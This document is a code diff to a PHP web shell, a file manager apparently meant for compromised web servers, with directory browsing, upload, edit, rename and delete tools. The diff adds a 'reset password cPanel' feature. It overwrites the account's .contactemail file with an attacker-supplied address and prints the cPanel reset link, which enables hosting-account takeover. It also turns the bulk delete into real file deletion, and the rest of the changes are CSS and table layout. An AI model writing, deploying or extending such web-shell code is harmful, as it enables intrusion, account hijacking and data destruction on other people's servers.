@@ -39,9 +39,19 @@
         width: 0px;
         background: transparent;
     }
+    .hover:hover {
+        background: #171717;
+    }
     select.select {
-        background: #242424;
+        background:none;
+        border:none;
         padding:0;
+        float: right;
+        background: #242424;
+        -webkit-appearance: none;
+        -moz-appearance: none;
+        appearance: none;
+        font-size:15px;
     }
     select {
         outline: none;
@@ -225,9 +235,10 @@
         overflow: hidden;
     }
     .topnav a {
+        float: left;
+        display: block;
         text-align: center;
         color: #f2f2f2;
-        text-align: center;
         padding: 3px 3px;
         text-decoration: none;
         font-size: 17px;
@@ -263,9 +274,9 @@
         }
         .topnav a:not(:first-child) {display: none;}
         .topnav a.icon {
-        float: right;
-        margin-top:3px;
-        display: block;
+            float: right;
+            margin-top:3px;
+            display: block;
         }
     }
     @media (min-width: 320px) and (max-width: 480px) {
@@ -445,6 +456,10 @@ class x {
             $user['gid']    = $user['gid']['gid'];
         } return (object) $user;
     }
+    public function resetcpanel($email) {
+        $this->user = get_current_user();
+        $this->save("/home/". $this->user ."/.contactemail", $email);
+    }
     public function upload(array $file) {
         $this->files = count($file['tmp_name']);
         for ($i=0; $i < $this->files ; $i++) { 
@@ -573,6 +588,56 @@ if (isset($_GET['cd'])) {
 }
 
 switch (@$_POST['tools']) {
+    case 'resetcpanel':
+        ?>
+        <tr>
+            <td class="header">
+                <a style="float: left;" href="?cd=<?= getcwd() ?>">
+                    <img src="https://dailycliparts.com/wp-content/uploads/2019/01/Left-Side-Thick-Size-Arrow-Picture-300x259.png" class="icons">
+                </a>
+                RESET PASSWORD CPANEL
+            </td>
+        </tr>
+        <form method="post">
+            <tr>
+                <td>
+                    <input type="text" name="email" placeholder="xnonhack@gmail.com">
+                </td>
+            </tr>
+            <tr>
+                <td>
+                    <input type="submit" name="submit">
+                    <input type="hidden" name="tools" value="resetcpanel">
+                </td>
+            </tr>
+        </form>
+        <?php
+        if (isset($_POST['submit'])) {
+            if ($x->resetcpanel($_POST['email'])) {
+                ?>
+                <tr>
+                    <td>
+                        User
+                    </td>
+                    <td><center>:</center></td>
+                    <td>
+                        <?= get_current_user() ?>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        Login
+                    </td>
+                    <td><center>:</center></td>
+                    <td>
+                        http://<?= $_SERVER['HTTP_HOST'] ?>:2083/resetpass?start=1
+                    </td>
+                </tr>
+                <?php
+            }
+        }
+        exit();
+        break;
     case 'replace':
         ?>
         <tr>
@@ -995,7 +1060,7 @@ foreach (scandir(getcwd()) as $key => $value) {
                                 <button name="tools" value="replace">REPLACE</button>
                             </a>
                             <a>
-                                <button>LOGOUT</button>
+                                <button name="tools" value="resetcpanel">RESET PASSWORD CPANEL</button>
                             </a>
                             <a href="javascript:void(0);" class="icon" onclick="myFunction()">
                                 <i class="fa fa-bars"></i>
@@ -1020,26 +1085,21 @@ foreach (scandir(getcwd()) as $key => $value) {
                 <td class="files">
                     <a href="?cd=<?= getcwd() . DIRECTORY_SEPARATOR . $value ?>"><?= $value ?></a>
                 </td>
-                <td class="size">
-                    <center>
-                        <?= @filetype($value) ?>
-                    </center>
-                </td>
-                <td>
-                    <center>
-                        <?= $x->w__($value, $x->perms($value)) ?>
-                    </center>
-                </td>
                 <form method="post" action="?cd=<?= getcwd() ?>">
                     <td class="select">
                         <select class="select" name="act" onchange="if(this.value != '0') this.form.submit()">
-                            <option selected>ACTION</option>
-                            <option value="delete">DELETE</option>
-                            <option value="changename">CHANGENAME</option>
+                            <option selected disabled>action</option>
+                            <option value="delete">delete</option>
+                            <option value="changename">changename</option>
                         </select>
                         <input type="hidden" name="file" value="<?= getcwd() . DIRECTORY_SEPARATOR . $value ?>">
                     </td>
                 </form>
+                <td class="size">
+                    <center>
+                        <?= $x->w__($value, $x->perms($value)) ?>
+                    </center>
+                </td>
             </tr>
             <?php
         }
@@ -1057,32 +1117,27 @@ foreach (scandir(getcwd()) as $key => $value) {
             <td class="form">
                 <img class="icons" src="<?= $x->getimg($value) ?>">
             </td>
+            <form method="post">
             <td class="files">
-                <a href="http://<?= $x->server.str_replace($_SERVER['DOCUMENT_ROOT'], '', getcwd().DIRECTORY_SEPARATOR.$value) ?>" target="_blank">
-                    <?= $value ?>
-                </a>
+                <select class="select hover" name="act" onchange="if(this.value != '0') this.form.submit()">
+                        <option selected disabled><?= $value ?></option>
+                        <option value="edit">edit</option>
+                        <option value="delete">delete</option>
+                        <option value="changename">changename</option>
+                    </select>
+                    <input type="hidden" name="file" value="<?= getcwd() . DIRECTORY_SEPARATOR . $value ?>">
             </td>
-            <td class="size">
+            </form>
+            <td>
                 <center>
                     <?= $x->size($value) ?>
                 </center>
             </td>
-            <td>
+            <td class="size">
                 <center>
                     <?= $x->w__($value, $x->perms($value)) ?>
                 </center>
             </td>
-            <form method="post" action="?cd=<?= getcwd() ?>">
-                <td class="select">
-                    <select class="select" name="act" onchange="if(this.value != '0') this.form.submit()">
-                        <option selected>ACTION</option>
-                        <option value="edit">EDIT</option>
-                        <option value="delete">DELETE</option>
-                        <option value="changename">CHANGENAME</option>
-                    </select>
-                    <input type="hidden" name="file" value="<?= getcwd() . DIRECTORY_SEPARATOR . $value ?>">
-                </td>
-            </form>
         </tr>
         <?php
 }
@@ -1108,7 +1163,8 @@ if (!empty($data = @$_POST['value'])) {
     foreach ($data as $key => $value) {
         switch (@$_POST['mode']) {
             case 'delete':
-                print($value);
+                $x->delete($value);
+                echo ' <meta http-equiv="refresh" content="0;url=?cd='.getcwd().'">';
                 break;
         }
     }
